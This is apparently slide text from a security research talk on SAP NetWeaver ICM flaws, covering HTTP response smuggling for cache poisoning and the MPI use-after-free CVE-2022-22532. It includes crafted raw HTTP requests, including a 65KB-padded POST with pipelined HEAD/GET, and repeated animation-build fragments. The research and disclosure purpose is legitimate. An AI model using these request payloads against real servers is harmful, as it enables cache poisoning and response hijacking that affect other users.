H
G
H
G
G
H
G
G
Proxy Web Cache
G
POST /sap/admin/public/default.html HTTP/1.1
Host: www.SapSys.com
Padding: {A*65KB~}
Content-Length: 160
HEAD /webdynpro/welcome/Welcome.html HTTP/1.1
Host: www.SapSys.com
GET 
http:///nwa 
HTTP/1.1
Host: www.SapSys.com
GET /target HTTP/1.1
Host: www.SapSys.com
Response Smuggling - Arbitrary Cache Poisoning
POST /sap/admin/public/default.html HTTP/1.1
Host: www.SapSys.com
Padding: {A*65KB~}
Content-Length: 160
HEAD /webdynpro/welcome/Welcome.html HTTP/1.1
Host: www.SapSys.com
GET 
http:///nwa 
HTTP/1.1
Host: www.SapSys.com
GET /target HTTP/1.1
Host: www.SapSys.com
Response Smuggling - Arbitrary Cache Poisoning
HEAD /webdynpro/welcome/Welcome.html HTTP/1.1
Host: www.SapSys.com
GET 
http:///nwa 
HTTP/1.1
Host: www.SapSys.com
GET /target HTTP/1.1
Host: www.SapSys.com
Response Smuggling - Arbitrary Cache Poisoning
HEAD /webdynpro/welcome/Welcome.html HTTP/1.1
Host: www.SapSys.com
GET 
http:///nwa 
HTTP/1.1
Host: www.SapSys.com
GET /target HTTP/1.1
Host: www.SapSys.com
HTTP/1.1 200 OK
server: SAP NetWeaver Application Server 
content-type: text/html
cache-control: max-age=604800
content-length: 3381
Response Smuggling - Arbitrary Cache Poisoning
GET 
http:///nwa 
HTTP/1.1
Host: www.SapSys.com
GET /target HTTP/1.1
Host: www.SapSys.com
HTTP/1.1 200 OK
server: SAP NetWeaver Application Server 
content-type: text/html
cache-control: max-age=604800
content-length: 3381
Response Smuggling - Arbitrary Cache Poisoning
GET 
http:///nwa 
HTTP/1.1
Host: www.SapSys.com
GET /target HTTP/1.1
Host: www.SapSys.com
HTTP/1.1 200 OK
server: SAP NetWeaver Application Server 
content-type: text/html
cache-control: max-age=604800
content-length: 3381
HTTP/1.1 302 Found
server: SAP NetWeaver Application Server
location: http:///webdynpro/resources/sap.co
m/tc~lm~itsam~ui~mainframe~wd/FloorPlanApp?ho
me=true
...
Response Smuggling - Arbitrary Cache Poisoning
GET /target HTTP/1.1
Host: www.SapSys.com
HTTP/1.1 200 OK
server: SAP NetWeaver Application Server 
content-type: text/html
cache-control: max-age=604800
content-length: 3381
HTTP/1.1 302 Found
server: SAP NetWeaver Application Server
location: http:///webdynpro/resources/sap.c
om/tc~lm~itsam~ui~mainframe~wd/FloorPlanApp?ho
me=true
...
Response Smuggling - Arbitrary Cache Poisoning
GET /target HTTP/1.1
Host: www.SapSys.com
HTTP/1.1 200 OK
server: SAP NetWeaver Application Server 
content-type: text/html
cache-control: max-age=604800
content-length: 3381
HTTP/1.1 302 Found
server: SAP NetWeaver Application Server
location: http:///webdynpro/resources/sap.c
om/tc~lm~itsam~ui~mainframe~wd/FloorPlanApp?ho
me=true
...
…
Response Smuggling - Arbitrary Cache Poisoning
GET /target HTTP/1.1
Host: www.SapSys.com
HTTP/1.1 200 OK
server: SAP NetWeaver Application Server 
content-type: text/html
cache-control: max-age=604800
content-length: 3381
HTTP/1.1 302 Found
server: SAP NetWeaver Application Server
location: http:///webdynpro/resources/sap.c
om/tc~lm~itsam~ui~mainframe~wd/FloorPlanApp?ho
me=true
...
…
Response Smuggling - Arbitrary Cache Poisoning
GET /target HTTP/1.1
Host: www.SapSys.com
Response Smuggling - Arbitrary Cache Poisoning
GET /target HTTP/1.1
Host: www.SapSys.com
HTTP/1.1 200 OK
server: SAP NetWeaver Application Server 
content-type: text/html
cache-control: max-age=604800
content-length: 3381
HTTP/1.1 302 Found
server: SAP NetWeaver Application Server
location: http:///webdynpro/resources/sap.c
om/tc~lm~itsam~ui~mainframe~wd/FloorPlanApp?ho
me=true
...
…
Response Smuggling - Arbitrary Cache Poisoning
DEMO:
HTTP Response Smuggling
MPI Buffers
●
Multi-Purpose shared memory buffers used to store:
○
HTTP Requests
○
HTTP Responses
○
Out Of Bounds data
●
Each Worker Thread have a Linked List of MPI Buffer pointers (one for each purpose)
MPI Request Buffers
POST / 
HTTP/1.1
GET /other 
HTTP/1.1
I/O Handler
ICM - HTTP Pipelining
●
SAP ICM Java by default accepts Pipelined Requests using different MPI Buffers
ICM WT
GET /1 HTTP/1.1
GET /2 HTTP/1.1
Java Process
Free MPI Buffer
Free MPI Buffer
Free MPI Buffer
Free MPI Buffer
Free MPI Buffer
Free MPI Buffer
Shared Memory
MPI Buffer
GET /1   GET/2
MPI Buffer
GET /2
HTTP/1.1 OK
MPI Request Buffers
GET /1 HTTP/1.1
GET /2 HTTP/1.1
I/O Handler
ICM WT
Java Process
Free MPI Buffer
Free MPI Buffer
Free MPI Buffer
Free MPI Buffer
Free MPI Buffer
Free MPI Buffer
Shared Memory
MPI Buffer
GET /1     
GET/2
MPI Buffer
GET /2
HTTP/1.1 OK
MPI Buffer
HTTP/1.1 OK
HTTP/1.1 OK 200
….
MPI Request Buffers
GET /1 HTTP/1.1
GET /2 HTTP/1.1
ICM - HTTP Pipelining
●
SAP ICM Java by default accepts Pipelined Requests using different MPI Buffers
I/O Handler
ICM WT
Java Process
Free MPI Buffer
Free MPI Buffer
Free MPI Buffer
Free MPI Buffer
Free MPI Buffer
Free MPI Buffer
Shared Memory
MPI Buffer
GET /2
HTTP/1.1 OK 200
….
MPI Request Buffers
GET /1 HTTP/1.1
GET /2 HTTP/1.1
GET /2 HTTP/1.1
GET /2 HTTP/1.1
ICM - HTTP Pipelining
●
SAP ICM Java by default accepts Pipelined Requests using different MPI Buffers
MPI Use After Free: CVE-2022-22532
I/O Handler
MpiIFreeAllBuffers
ICM WT
GET /1 HTTP/1.1
….66KB data
GET /2 HTTP/1.1
Java Process
Free MPI Buffer
Free MPI Buffer
Free MPI Buffer
Free MPI Buffer
Free MPI Buffer
Free MPI Buffer
Shared Memory
MPI Buffer
GET /1 HTTP/1.1
MPI Buffer
Body + GET /2
HTTP/1.1 OK
MPI Request Buffers
GET /1 HTTP/1.1
..Rest of Req1 Body..
GET /2 HTTP/1.1
GET /2 HTTP/1.1
MPI Buffer
GET /2 HTTP/1.1
I/O Handler
ICM WT
Java Process
Free MPI Buffer
Free MPI Buffer
Free MPI Buffer
Free MPI Buffer
Free MPI Buffer
Free MPI Buffer
Shared Memory
MPI Buffer
GET /1 HTTP/1.1
MPI Buffer
Body + GET /2
MPI Request Buffers
GET /1 HTTP/1.1
GET /2 HTTP/1.1
MPI Buffer
GET /2 HTTP/1.1
MPI Buffer
HTTP/1.1 OK
HTTP/1.1 OK 200
….
MpiIFreeAllBuffers
I/O Handler
ICM WT
Java Process
Free MPI Buffer
Free MPI Buffer
Free MPI Buffer
Free MPI Buffer
Free MPI Buffer
Free MPI Buffer
Shared Memory
MPI Buffer
GET /1 HTTP/1.1
MPI Buffer
Body + GET /2
MPI Buffer
GET /2 HTTP/1.1
MPI Request Buffers
GET /1 HTTP/1.1
GET /2 HTTP/1.1
GET /2 HTTP/1.1
MpiIFreeAllBuffers
I/O Handler
ICM WT
Java Process
Free MPI Buffer
Free MPI Buffer
Free MPI Buffer
Free MPI Buffer
Free MPI Buffer
Free MPI Buffer
Shared Memory
GET /2 HTTP/1.1
MpiIFreeAllBuffers() does NOT delete references
ERROR
MpiIFreeAllBuffers
MPI Request Buffers
GET /1 HTTP/1.1
GET /2 HTTP/1.1
MPI Handler “allocates” using a stack data structure (LIFO)
I/O Handler 1
ICM WT 1
Java Process
Free MPI Buffer
Free MPI Buffer
Free MPI Buffer
Free MPI Buffer
Free MPI Buffer
Free MPI Buffer
Shared Memory
I/O Handler 2
ICM WT 2
GET /X 
HTTP/1.1
….
MPI Buffer
GET /X HTTP/1.1
GET /2 HTTP/1.1
MPI Use After Free
MPI Use After Free - Write After Free
●
When a request is sent incomplete, the ICM will wait for more data
○
No double CR-LB characters are found 
○
Body shorter than Message-Length header 
●
Worker Thread is set to READ mode
●
When more data arrives the Worker Thread writes the MPI Buffer
●
The offset of the last byte (NULL) is stored by the Worker Thread to know where to write
ICM WT
Java Process
Free MPI Buffer
Free MPI Buffer
Free MPI Buffer
Free MPI Buffer
Free MPI Buffer
Free MPI Buffer
Shared Memory
MPI Buffer
ICM WT 
I/O Handler
GET / HTTP/1.1
Hos
READ
[x00]
MPI Buffer
OFFSET: 0
MPI Use After Free - Write After Free
ICM WT
Java Process
Free MPI Buffer
Free MPI Buffer
Free MPI Buffer
Free MPI Buffer
Free MPI Buffer
Free MPI Buffer
Shared Memory
MPI Buffer
ICM WT 
I/O Handler
READ
GET / HTTP/1.1\r\n
Hos[x00]
MPI Buffer
OFFSET: 19
GET / HTTP/1.1
PARSE
t: SapSys.com
Content-Length: 0
MPI Use After Free - Write After Free
READ
ICM WT
Java Process
Free MPI Buffer
Free MPI Buffer
Free MPI Buffer
Free MPI Buffer
Free MPI Buffer
Free MPI Buffer
Shared Memory
Free MPI Buffer
GET / HTTP/1.1
ICM WT 
I/O Handler
GET / HTTP/1.1\r\n
Host: SapSys.com\r\n
Content-Length: 0\r\n
\r\n[x00]
MPI Buffer
OFFSET: 55
PARSE
HANDLE
MPI Use After Free - Write After Free
ICM WT 1
Java Process
Free MPI Buffer
Free MPI Buffer
Free MPI Buffer
Shared Memory
MPI Buffer
ICM WT 1
I/O Handler
MPI Buffer
WT 1 OFFSET: 1
ICM WT 2
ICM WT 2
I/O Handler
GET /1 HTTP/1.1
….65KB data
X
MPI Buffer
MPI Buffer
GET /1 HTTP/1.1
Body + X
X
Req1 Body..
X
HTTP/1.1 200 OK
X[x00]
Smuggling without a Proxy
ICM WT 1